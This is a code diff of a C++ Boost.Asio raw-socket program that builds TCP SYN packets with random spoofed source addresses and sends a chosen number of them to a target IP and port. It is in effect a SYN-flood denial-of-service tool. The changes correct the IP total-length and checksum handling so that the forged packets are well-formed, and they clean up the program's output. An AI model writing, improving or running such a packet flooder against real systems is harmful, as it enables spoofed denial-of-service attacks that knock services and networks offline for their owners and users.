@@ -23,28 +23,28 @@ std::string hostname_resolver(const char* hostname, std::string hint = "")
     return it->endpoint().address().to_string();
 }
 
-void set_syn_packet(std::ostream &os, 
-        std::string dest, std::string dport)
+void set_syn_packet(std::ostream &os, std::string dest, std::string dport)
 {    
     ip_header iphdr;
     iphdr.version(4);
     iphdr.ihl(iphdr.length() / 4);
-    iphdr.tot_len(iphdr.length() + tcp_header::min_length());
     iphdr.tos(0x10);
     iphdr.ttl(32);
     iphdr.frag_off(IP_DF);
     iphdr.protocol(IPPROTO_TCP);
     iphdr.saddr(rand());
     iphdr.daddr(iphdr.address_to_binary(dest));
-    iphdr.check();
 
     tcp_header tcp_syn_header(iphdr.address_to_string(iphdr.saddr()), dest);
     tcp_syn_header.source(rand());
-    tcp_syn_header.dest(atoi(dport.c_str()));
+    tcp_syn_header.dest(std::atoi(dport.c_str()));
     tcp_syn_header.doff(20/4);
     tcp_syn_header.syn(true);
     tcp_syn_header.seq(0x81b4b626);
     tcp_syn_header.window(32792);
+     
+    iphdr.tot_len(iphdr.length() + tcp_syn_header.length());
+    iphdr.check();
     os << iphdr << tcp_syn_header; 
 }
  
@@ -69,11 +69,9 @@ int main(int argc, char **argv)
         boost::asio::ip::raw_tcp::resolver::query query(boost::asio::ip::raw_tcp::v4(), argv[1], "");
         boost::asio::ip::raw_tcp::endpoint destination = *resolver.resolve(query);
 
-        std::cout << "Socket.native_handle() = " << socket.native_handle() << std::endl;
-
         boost::asio::streambuf request_buffer;
         std::ostream os(&request_buffer);
-        int num = atoi(argv[3]);
+        int num = std::atoi(argv[3]);
         for( ; i <= num; ++i ) {
             set_syn_packet(os, result, argv[2]);
             socket.send_to(request_buffer.data(), destination);
@@ -83,9 +81,9 @@ int main(int argc, char **argv)
             io_service.reset();
         }
     } catch( std::exception &e ) {
-        std::cerr << std::endl << " [-] Exception: " << e.what() << std::endl;
+        std::cerr << std::endl << "[-] Exception: " << e.what() << std::endl;
     } catch( std::string &e ) {
-        std::cerr << " [-] Exception: " << e << std::endl;
+        std::cerr << "[-] Exception: " << e << std::endl;
         std::cout << "Usage: " << argv[0] << " DEST_IP PORT NUM" << std::endl;
     }
     std::cout << "[*] Total: " << i-1 << " packets sent" << std::endl;
